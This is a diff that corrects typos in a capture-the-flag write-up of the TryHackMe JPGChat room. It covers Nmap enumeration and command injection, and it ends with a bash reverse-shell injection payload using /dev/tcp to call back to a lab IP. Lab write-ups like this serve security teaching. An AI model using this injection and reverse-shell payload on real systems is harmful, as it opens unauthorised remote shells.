@@ -8,14 +8,14 @@ comments: true
 
 [JPGChat](https://tryhackme.com/room/jpgchat) was a very quick and easy box, but it does have a simple OSINT step that was a bit of fun to follow.
 
-## Nmap Emumeration
-The first step in any pentest situation is enumeration. It's important to get as much information about the machine and its users as possible. To start off, we'll use Nmap to perform a port scan and see what services are active and listening on the box. Nmap is a versitle tool, and many people have their own preferred methods to balance speed and accuracy, but here are the options I'll use.
+## Nmap Enumeration
+The first step in any pentest situation is enumeration. It's important to get as much information about the machine and its users as possible. To start off, we'll use Nmap to perform a port scan and see what services are active and listening on the box. Nmap is a versatile tool, and many people have their own preferred methods to balance speed and accuracy, but here are the options I'll use.
 
 - `-sC`: Run default scripts. Nmap can do additional enumeration beyond just checking for open ports, and this option will run some quick and useful extra scans to give us even more information about what we're working with.
 - `-sV`: Run version detection. Knowing what specific version of a service is in use can help with finding potential vulnerabilities, or ruling them out.
 - `-v`: Be verbose. This outputs extra information to the console as the scan runs, the most useful of which are status updates and showing open ports as it finds them.
-- `-oN`: Output to a file in the Nmap format. Having a file to refer back to intead of having to scroll through console output is very useful. Nmap can save to a variety of file formats, and you may have reasons to use them, but for me just the normal plain-text format is enough.
-- `-p`: Scan specific ports. `-p<n>` will scan a specific port, and `-p-` scans every port from 1 to 65,535. While doing a full port scan is good, it can take a while, so it's good to let that one run whle you're doing other tasks.
+- `-oN`: Output to a file in the Nmap format. Having a file to refer back to instead of having to scroll through console output is very useful. Nmap can save to a variety of file formats, and you may have reasons to use them, but for me just the normal plain-text format is enough.
+- `-p`: Scan specific ports. `-p<n>` will scan a specific port, and `-p-` scans every port from 1 to 65,535. While doing a full port scan is good, it can take a while, so it's good to let that one run while you're doing other tasks.
 
 We'll run two Nmap scans. The first one will scan the top 1000 ports that are listening to give us a strong starting point, and the second scan will run in the background and check every possible port. Since this second scan will take longer, we can let it run in the background while we work on other things.
 
@@ -24,7 +24,7 @@ nmap -sC -sV -v -oN nmap-initial.nmap 10.10.54.184
 nmap -p- -v -oN nmap-allports.nmap 10.10.54.184
 ```
 
-Nmap finds two open ports: port 22 running SSH, and port 3000. While Nmap can't identify what service is running, it does try to give us some informaiton that we can use to identify the service ourselves.
+Nmap finds two open ports: port 22 running SSH, and port 3000. While Nmap can't identify what service is running, it does try to give us some information that we can use to identify the service ourselves.
 
 ```
 3000/tcp open  ppp?
@@ -82,7 +82,7 @@ your report:
 wes
 ```
 
-Our `whoami` command gives us a username back, meaning we do indeed have sucessful command injection. Now we can build out a reverse shell to get proper access to the box. If you've never built a reverse shell before, there are [plenty of online resources](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to help you out. Below is one of the more basic and common bash reverse shells.
+Our `whoami` command gives us a username back, meaning we do indeed have successful command injection. Now we can build out a reverse shell to get proper access to the box. If you've never built a reverse shell before, there are [plenty of online resources](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to help you out. Below is one of the more basic and common bash reverse shells.
 
 ```
 '; bash -c 'bash -i >& /dev/tcp/10.13.14.52/9001 0>&1'; #
